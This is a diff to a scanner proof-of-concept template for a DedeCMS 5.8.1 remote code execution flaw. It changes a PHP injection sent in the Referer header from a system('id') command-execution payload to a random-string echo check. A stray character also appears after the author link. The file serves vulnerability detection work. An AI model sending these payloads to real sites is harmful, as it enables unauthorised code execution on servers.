@@ -1,19 +1,20 @@
 name: poc-yaml-dedecms-v581-rce
 transport: http
+set: 
+    p1: randomLowercase(10)
 rules:
   r1:
     request:
       method: GET
       headers:
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
-        Referer: <?php "system"(id);?>
+        Referer: <?php echo({{p1}});?>
       path: "/plus/flink.php?dopost=save"
     expression: |
-      response.status == 200 && response.body.bcontains(b"uid")
+      response.status == 200 && response.body.bcontains(bytes(p1))
 expression:
   r1()
 
 detail:
-  author: Henry4E36(https://github.com/Henry4E36/dedecms_5.8.1_RCE)
+  author: Henry4E36(https://github.com/Henry4E36/dedecms_5.8.1_RCE)ß
   links:
     - https://mp.weixin.qq.com/s/ln8nj53_5TfiyBJyaLLUZA
